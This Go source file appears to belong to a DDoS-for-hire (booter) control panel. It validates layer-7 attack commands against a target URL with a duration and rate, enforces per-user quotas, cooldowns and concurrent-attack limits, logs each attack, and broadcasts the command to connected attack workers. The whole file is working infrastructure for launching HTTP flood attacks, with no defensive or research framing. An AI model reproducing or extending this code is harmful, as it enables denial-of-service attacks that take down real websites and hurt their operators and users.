package main

import (
	"fmt"
	"net"
	"net/url"
	"strconv"
	"time"
)

// L7Attack represents a layer 7 attack
type L7Attack struct {
	Method   string // "browser", "http", etc.
	URL      string
	Rate     int
	Duration int
	User     string
}

// ParseL7Attack validates parameters and returns an L7Attack or an error.
// args must contain [url, duration, rate] in that order.
func ParseL7Attack(method string, args []string, user *User) (*L7Attack, error) {
	if len(args) != 3 {
		return nil, fmt.Errorf("Usage: %s <url> <time> <rate>", method)
	}

	// Validate URL
	urlStr := args[0]
	u, err := url.Parse(urlStr)
	if err != nil || u.Host == "" {
		return nil, fmt.Errorf("Invalid URL")
	}
	host := u.Hostname()
	if host == "" {
		return nil, fmt.Errorf("Missing host in URL")
	}
	_, err = net.LookupHost(host)
	if err != nil {
		return nil, fmt.Errorf("Domain does not exist or is not resolvable")
	}

	// Validate duration
	duration, err := strconv.Atoi(args[1])
	if err != nil || duration <= 0 {
		return nil, fmt.Errorf("Invalid duration, must be a positive number")
	}
	if duration > user.Maxtime {
		return nil, fmt.Errorf("Duration exceeds your maxtime (%d seconds)", user.Maxtime)
	}

	// Validate rate
	rate, err := strconv.Atoi(args[2])
	if err != nil || rate < 1 || rate > 250 {
		return nil, fmt.Errorf("Rate must be between 1 and 250")
	}

	// Daily limit
	sent, err := UserOngoingAttacks(user.Username, time.Now())
	if err == nil && len(sent) >= user.MaxDaily && !user.Admin {
		return nil, fmt.Errorf("Daily attack limit exceeded")
	}

	// Cooldown
	thererunning, _ := UserOngoingAttacks(user.Username, time.Now())
	if len(thererunning) > 0 && user.Cooldown > 0 {
		recent := thererunning[0]
		for _, a := range thererunning {
			if a.Sent > recent.Sent {
				recent = a
			}
		}
		if recent.Sent+int64(user.Cooldown) > time.Now().Unix() {
			return nil, fmt.Errorf("You are in cooldown")
		}
	}

	// Concurrent attacks per user
	running, err := UserOngoingAttacks(user.Username, time.Now())
	if err != nil {
		return nil, fmt.Errorf("Error checking concurrent attacks")
	}
	if user.Conns > 0 && len(running) >= user.Conns {
		return nil, fmt.Errorf("Concurrent attack limit exceeded")
	}

	// Global attack limit
	globalRunning, err := OngoingAttacks(time.Now())
	if err != nil || len(globalRunning) >= Options.Templates.Attacks.MaximumOngoing {
		return nil, fmt.Errorf("Maximum global attack slots reached")
	}

	// Check available L7 workers
	workersMux.RLock()
	workerCount := len(workers)
	workersMux.RUnlock()
	if workerCount == 0 {
		return nil, fmt.Errorf("No L7 workers available")
	}

	// Log the attack
	err = LogAttack(&AttackLog{
		Target:   urlStr,
		Duration: duration,
		Flags:    fmt.Sprintf("rate=%d", rate),
		Sent:     time.Now().Unix(),
		Finish:   time.Now().Add(time.Duration(duration) * time.Second).Unix(),
		User:     user.Username,
		Devices:  0,
	})
	if err != nil {
		return nil, fmt.Errorf("Failed to log attack: %v", err)
	}

	return &L7Attack{
		Method:   method,
		URL:      urlStr,
		Rate:     rate,
		Duration: duration,
		User:     user.Username,
	}, nil
}

// SendL7Attack sends the command to all connected workers
func SendL7Attack(attack *L7Attack) {
	cmd := map[string]interface{}{
		"type":     "attack",
		"method":   attack.Method,
		"url":      attack.URL,
		"rate":     attack.Rate,
		"duration": attack.Duration,
		"user":     attack.User,
	}
	SendToWorkers(cmd)
}
